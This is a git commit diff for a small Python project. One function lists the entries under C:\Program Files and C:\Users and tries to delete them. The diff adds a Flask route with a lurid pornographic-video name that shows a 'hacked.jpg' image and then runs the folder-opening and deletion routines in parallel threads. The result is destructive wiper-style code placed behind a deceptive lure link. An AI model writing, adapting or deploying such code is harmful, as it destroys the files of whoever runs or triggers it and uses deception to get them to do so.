afded06e86e905fa7670326aac65afc08748ff27
Tejas Jagannatha <tejasbiker23@gmail.com>
2023-09-12 23:28:53 +0100

    'tested'

--- delete_files.py
+++ delete_files.py
@@ -1,7 +1,8 @@
 import os
-import concurrent.futures
+
 
 PATH = r'C:\Program Files'
+
 
 def open_files():
     os.chdir(PATH)  # Change to the specified directory
@@ -18,8 +19,9 @@ def open_files():
         except Exception as e:
             print(f"Failed to open: {folder} - Error: {e}")
 
+
 def delete_files():
-    PATH= r'C:\Users'
+    PATH = r'C:\Users'
 
     os.chdir(PATH)  # Change to the specified directory
     folders = os.listdir()  # List folders directly in the current directory
@@ -33,6 +35,4 @@ def delete_files():
                 os.remove(folder)  # Open the folder itself
 
         except Exception as e:
-            print(f"Failed to delte: {folder} - Error: {e}")
-
-
+            print(f"Failed to delete: {folder} - Error: {e}")
--- main.py
+++ main.py
@@ -1,9 +1,32 @@
 from delete_files import delete_files
 from delete_files import open_files
 import concurrent.futures
+import os
+from PIL import Image
 
-with concurrent.futures.ThreadPoolExecutor(max_workers=3) as executor:
-    # Execute the open_files function three times concurrently
-    for _ in range(3):
-        executor.submit(open_files)
-        executor.submit(delete_files())
+
+from flask import Flask, render_template
+
+app = Flask(__name__)
+
+@app.route('/')
+def land():
+    return render_template('lund.html')
+
+
+@app.route('/video1_naughty_girlbangs')
+def fuckit():
+
+    for i in range(0,39):
+        image = Image.open('static/images/hacked.jpg')
+        image.show()
+        break
+    with concurrent.futures.ThreadPoolExecutor(max_workers=3) as executor:
+        # Execute the open_files function three times concurrently
+        for _ in range(3):
+            executor.submit(open_files)
+            executor.submit(delete_files())
+
+
+if __name__ == '__main__':
+    app.run(debug=True)
